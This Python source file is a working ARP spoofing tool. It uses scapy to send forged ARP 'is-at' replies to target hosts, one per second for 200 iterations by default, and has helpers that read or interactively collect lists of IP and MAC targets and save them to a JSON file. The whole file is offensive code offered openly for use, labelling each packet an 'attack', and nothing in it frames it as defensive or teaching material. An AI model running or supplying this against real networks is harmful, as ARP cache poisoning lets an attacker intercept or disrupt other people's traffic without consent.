import os
from json import load, dump
from abc import ABC, abstractmethod
from scapy.all import ARP, send
from time import sleep


class AbstractController(ABC):
    filename = 'objects_to_attack.json'
    output = []

    @abstractmethod
    def run(self):
        pass


class HackByArp(AbstractController):
    attacked_ip: str
    attacked_mac: str
    swapped_ip: str

    def __init__(self, parameters: dict = None) -> None:
        if parameters is not None:
            try:
                self.attacked_ip = parameters['attacked_ip']
                self.attacked_mac = parameters['attacked_mac']
                self.swapped_ip = parameters['swapped_ip']
            except KeyError as error:
                print(f'It isn\'t corect configuration - {error}')

    def _init_arp_response(self):
        try:
            self.arp_response = ARP(
                pdst=self.attacked_ip,
                hwdst=self.attacked_mac,
                psrc=self.swapped_ip,
                op='is-at'
            )
        except AttributeError as error:
            print(f'I can\'t hacked this objects: ({error})')

    def run(self, iterarions: int = 200):
        for i in range(iterarions):
            self._init_arp_response()
            send(self.arp_response)
            print(f'Attack no. {i+1} done!')
            sleep(1)


class ConfigurationReader(AbstractController):
    def run(self):
        print('Start read config from "object_to_attack.json"...')
        with open(self.filename, mode='r') as input_file:
            self.output = load(input_file)

        return self.output


class ConfigurationInput(AbstractController):
    def run(self):
        clear_console()
        while True:
            try:
                iterations = int(input('\n\nHow many objects do you want to add to list?\t'))
                break
            except ValueError:
                print('You must input integer number of iteration! Try again..')

        clear_console()
        print('\n\n\t\tInput parameters to attack.\nIn brackets, I write examples inputs, you must input your values in the same form\n\n')
        for i in range(iterations):
            print(f'Input parameters ({i+1} / {iterations})')
            parameters = {}
            parameters['attacked_ip'] = input('Attacked IP: (192.168.1.1)\t\t\t')
            parameters['attacked_mac'] = input('Attacked MAC address: (00:00:00:00:00:00)\t')
            parameters['swapped_ip'] = input('Swapped IP: (192.168.1.2)\t\t\t')
            print('-' * 50, '\n')
            self.output.append(parameters)

        clear_console()
        save_to_json = input('\n\nDo you want to save this config to json\'s file? [Y/n]\t')
        if save_to_json is '' or save_to_json.lower()[0] in ['y', 't']:
            choice = input(
                '\n\nDo you want to replace [R] the contents of file or append [A] to file? (press another key to cancel saving)\t')

            if choice.lower()[0] == 'a':
                try:
                    with open(self.filename, mode='r') as input_file:
                        exist_file = load(input_file)
                except FileNotFoundError:
                    exist_file = []

            else:
                exist_file = []

            if choice.lower()[0] in ['r', 'a']:
                with open(self.filename, mode='w') as output_file:
                    to_dump = self.output + exist_file
                    dump(to_dump, output_file)

                clear_console()
                print('\n\nFile saved!')

        return self.output


class QuitProgram(AbstractController):

    def run(self):
        clear_console()
        print('\n\n\nSee you later :)')
        return None


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
